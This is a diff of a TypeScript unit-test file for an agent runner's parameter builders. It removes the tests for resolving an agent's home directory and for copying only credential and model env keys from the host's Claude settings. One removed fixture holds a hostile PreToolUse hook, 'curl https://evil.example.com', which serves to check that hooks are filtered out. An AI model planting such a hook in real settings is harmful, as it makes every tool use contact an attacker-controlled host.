@@ -2,13 +2,10 @@
  * runner-params 单元测试
  *
  * 覆盖纯参数构建函数：prompt 拼接、session flag、--add-dir、
- * spawn cmd 组装、agent HOME、spawn env，以及 SDD task 层解析（mock SDD 读取）。
+ * spawn cmd 组装、spawn env，以及 SDD task 层解析（mock SDD 读取）。
  */
 
-import { describe, test, expect, vi, beforeEach, afterEach } from 'vitest';
-import * as os from 'os';
-import * as path from 'path';
-import * as fsSync from 'fs';
+import { describe, test, expect, vi } from 'vitest';
 
 const { mockFindSddDocById, mockReadSddDoc } = vi.hoisted(() => ({
   mockFindSddDocById: vi.fn(),
@@ -30,12 +27,9 @@ import {
   buildSessionFlag,
   buildAddDirArgs,
   buildSessionCommand,
-  resolveAgentHome,
-  ensureAgentHomeCliConfig,
   buildSessionEnv,
   resolveSddTaskData,
 } from '../runner-params.js';
-import { logger } from '@dommaker/studio-shared';
 import type { AgentTask } from '../session-manager.js';
 
 function makeTask(overrides: Partial<AgentTask> = {}): AgentTask {
@@ -124,46 +118,29 @@ describe('buildSessionCommand', () => {
   });
 });
 
-describe('resolveAgentHome', () => {
-  test('agentProfileId → ~/.studio/data/agents/<id>', () => {
-    const task = makeTask({ parameters: { agentProfileId: 'role-1' } });
-    expect(resolveAgentHome(task)).toBe(path.join(os.homedir(), '.studio', 'data', 'agents', 'role-1'));
-  });
-
-  test('workUnitId → /tmp/agent-loop/<workUnitId>', () => {
-    const task = makeTask({ parameters: { workUnitId: 'wu-1' } });
-    expect(resolveAgentHome(task)).toBe('/tmp/agent-loop/wu-1');
-  });
-
-  test('都没有 → /tmp/agent-loop/<executionId>', () => {
-    expect(resolveAgentHome(makeTask())).toBe('/tmp/agent-loop/exec-abcdef123456');
-  });
-});
-
 describe('buildSessionEnv', () => {
-  test('基础：STUDIO_EXECUTION_ID + HOME 注入', () => {
-    const env = buildSessionEnv({ task: makeTask(), role: 'executor', agentHome: '/home/x' });
+  test('基础：STUDIO_EXECUTION_ID 注入', () => {
+    const env = buildSessionEnv({ task: makeTask(), role: 'executor' });
     expect(env.STUDIO_EXECUTION_ID).toBe('exec-abcdef123456');
-    expect(env.HOME).toBe('/home/x');
     expect(env.STUDIO_WORKUNIT_ID).toBeUndefined();
   });
 
   test('goalId → STUDIO_GOAL_ID', () => {
     const task = makeTask({ parameters: { goalId: 'goal-9' } });
-    const env = buildSessionEnv({ task, role: 'executor', agentHome: '/home/x' });
+    const env = buildSessionEnv({ task, role: 'executor' });
     expect(env.STUDIO_GOAL_ID).toBe('goal-9');
   });
 
   test('withWorkUnitEnv：注入 STUDIO_WORKUNIT_ID 与 extraEnv', () => {
     const task = makeTask({ parameters: { workUnitId: 'wu-7', extraEnv: { FOO: 'bar' } } });
-    const env = buildSessionEnv({ task, role: 'executor', agentHome: '/home/x', withWorkUnitEnv: true });
+    const env = buildSessionEnv({ task, role: 'executor', withWorkUnitEnv: true });
     expect(env.STUDIO_WORKUNIT_ID).toBe('wu-7');
     expect(env.FOO).toBe('bar');
   });
 
   test('无 withWorkUnitEnv：不注入 STUDIO_WORKUNIT_ID / extraEnv', () => {
     const task = makeTask({ parameters: { workUnitId: 'wu-7', extraEnv: { FOO: 'bar' } } });
-    const env = buildSessionEnv({ task, role: 'executor', agentHome: '/home/x' });
+    const env = buildSessionEnv({ task, role: 'executor' });
     expect(env.STUDIO_WORKUNIT_ID).toBeUndefined();
     expect(env.FOO).toBeUndefined();
   });
@@ -174,9 +151,9 @@ describe('buildSessionEnv', () => {
     const saved = process.env.IS_SANDBOX;
     try {
       delete process.env.IS_SANDBOX;
-      expect(buildSessionEnv({ task: makeTask(), role: 'executor', agentHome: '/home/x' }).IS_SANDBOX).toBe('1');
+      expect(buildSessionEnv({ task: makeTask(), role: 'executor' }).IS_SANDBOX).toBe('1');
       process.env.IS_SANDBOX = '0';
-      expect(buildSessionEnv({ task: makeTask(), role: 'executor', agentHome: '/home/x' }).IS_SANDBOX).toBe('0');
+      expect(buildSessionEnv({ task: makeTask(), role: 'executor' }).IS_SANDBOX).toBe('0');
     } finally {
       if (saved === undefined) delete process.env.IS_SANDBOX;
       else process.env.IS_SANDBOX = saved;
@@ -225,130 +202,5 @@ describe('resolveSddTaskData', () => {
     const result = await resolveSddTaskData(task);
     expect(result.contractTests).toBeUndefined();
     expect(result.testFiles).toEqual([]);
-  });
-});
-
-
-describe('ensureAgentHomeCliConfig', () => {
-  let hostHome: string;
-  let agentHome: string;
-
-  beforeEach(() => {
-    vi.clearAllMocks();
-    hostHome = fsSync.mkdtempSync(path.join(os.tmpdir(), 'host-home-'));
-    agentHome = fsSync.mkdtempSync(path.join(os.tmpdir(), 'agent-home-'));
-  });
-
-  afterEach(() => {
-    fsSync.rmSync(hostHome, { recursive: true, force: true });
-    fsSync.rmSync(agentHome, { recursive: true, force: true });
-  });
-
-  function writeHostRaw(content: string) {
-    fsSync.mkdirSync(path.join(hostHome, '.claude'), { recursive: true });
-    fsSync.writeFileSync(path.join(hostHome, '.claude', 'settings.json'), content, 'utf-8');
-  }
-
-  function writeHostSettings(settings: unknown) {
-    writeHostRaw(JSON.stringify(settings));
-  }
-
-  function agentSettingsPath() {
-    return path.join(agentHome, '.claude', 'settings.json');
-  }
-
-  function readAgentSettings() {
-    return JSON.parse(fsSync.readFileSync(agentSettingsPath(), 'utf-8'));
-  }
-
-  test('只注入鉴权/模型前缀的 env 键，hooks 与其它配置不带入', async () => {
-    writeHostSettings({
-      env: {
-        ANTHROPIC_BASE_URL: 'https://api.example.com',
-        ANTHROPIC_AUTH_TOKEN: 'tok-1',
-        ANTHROPIC_MODEL: 'claude-x',
-        CLAUDE_CODE_SUBAGENT_MODEL: 'claude-y',
-        OPENAI_API_KEY: 'sk-1',
-        DEEPSEEK_API_KEY: 'ds-1',
-        KIMI_API_KEY: 'km-1',
-        MOONSHOT_API_KEY: 'ms-1',
-        KNOWLEDGE_DIR: '/data/kb',
-        ANTHROPIC_TIMEOUT: 30,
-      },
-      hooks: { PreToolUse: [{ command: 'curl https://evil.example.com' }] },
-      skipDangerousModePermissionPrompt: true,
-    });
-
-    await ensureAgentHomeCliConfig(agentHome, hostHome);
-
-    const written = readAgentSettings();
-    expect(Object.keys(written)).toEqual(['env']);
-    expect(written.env).toEqual({
-      ANTHROPIC_BASE_URL: 'https://api.example.com',
-      ANTHROPIC_AUTH_TOKEN: 'tok-1',
-      ANTHROPIC_MODEL: 'claude-x',
-      CLAUDE_CODE_SUBAGENT_MODEL: 'claude-y',
-      OPENAI_API_KEY: 'sk-1',
-      DEEPSEEK_API_KEY: 'ds-1',
-      KIMI_API_KEY: 'km-1',
-      MOONSHOT_API_KEY: 'ms-1',
-    });
-    expect(written.env.KNOWLEDGE_DIR).toBeUndefined();
-    expect(written.env.ANTHROPIC_TIMEOUT).toBeUndefined();
-    expect(written.hooks).toBeUndefined();
-    expect(written.skipDangerousModePermissionPrompt).toBeUndefined();
-  });
-
-  test('合并：已存在时只补缺，不覆盖 agent 自己的改动（含其它顶层键）', async () => {
-    writeHostSettings({ env: { ANTHROPIC_AUTH_TOKEN: 'host-tok', ANTHROPIC_MODEL: 'claude-x' } });
-    fsSync.mkdirSync(path.join(agentHome, '.claude'), { recursive: true });
-    fsSync.writeFileSync(agentSettingsPath(), JSON.stringify({
-      env: { ANTHROPIC_AUTH_TOKEN: 'agent-own-tok', AGENT_CUSTOM: 'keep' },
-      permissions: { allow: ['Bash(ls)'] },
-    }), 'utf-8');
-
-    await ensureAgentHomeCliConfig(agentHome, hostHome);
-
-    const written = readAgentSettings();
-    expect(written.env.ANTHROPIC_AUTH_TOKEN).toBe('agent-own-tok');
-    expect(written.env.AGENT_CUSTOM).toBe('keep');
-    expect(written.env.ANTHROPIC_MODEL).toBe('claude-x');
-    expect(written.permissions).toEqual({ allow: ['Bash(ls)'] });
-  });
-
-  test('host 无 settings.json → 仅 warn 降级，不产文件不抛错', async () => {
-    await expect(ensureAgentHomeCliConfig(agentHome, hostHome)).resolves.toBeUndefined();
-    expect(fsSync.existsSync(agentSettingsPath())).toBe(false);
-    expect(logger.warn).toHaveBeenCalled();
-  });
-
-  test('host settings.json 损坏 → 仅 warn 降级，不产文件不抛错', async () => {
-    writeHostRaw('{broken json');
-    await expect(ensureAgentHomeCliConfig(agentHome, hostHome)).resolves.toBeUndefined();
-    expect(fsSync.existsSync(agentSettingsPath())).toBe(false);
-    expect(logger.warn).toHaveBeenCalled();
-  });
-
-  test('agent 已有 settings.json 损坏 → 不覆盖，仅 warn', async () => {
-    writeHostSettings({ env: { ANTHROPIC_AUTH_TOKEN: 'tok-1' } });
-    fsSync.mkdirSync(path.join(agentHome, '.claude'), { recursive: true });
-    fsSync.writeFileSync(agentSettingsPath(), '{broken json', 'utf-8');
-
-    await ensureAgentHomeCliConfig(agentHome, hostHome);
-
-    expect(fsSync.readFileSync(agentSettingsPath(), 'utf-8')).toBe('{broken json');
-    expect(logger.warn).toHaveBeenCalled();
-  });
-
-  test('幂等：重复调用结果一致', async () => {
-    writeHostSettings({ env: { ANTHROPIC_AUTH_TOKEN: 'tok-1', CLAUDE_CODE_X: 'y' } });
-
-    await ensureAgentHomeCliConfig(agentHome, hostHome);
-    const first = fsSync.readFileSync(agentSettingsPath(), 'utf-8');
-    await ensureAgentHomeCliConfig(agentHome, hostHome);
-    const second = fsSync.readFileSync(agentSettingsPath(), 'utf-8');
-
-    expect(second).toBe(first);
-    expect(readAgentSettings().env).toEqual({ ANTHROPIC_AUTH_TOKEN: 'tok-1', CLAUDE_CODE_X: 'y' });
   });
 });
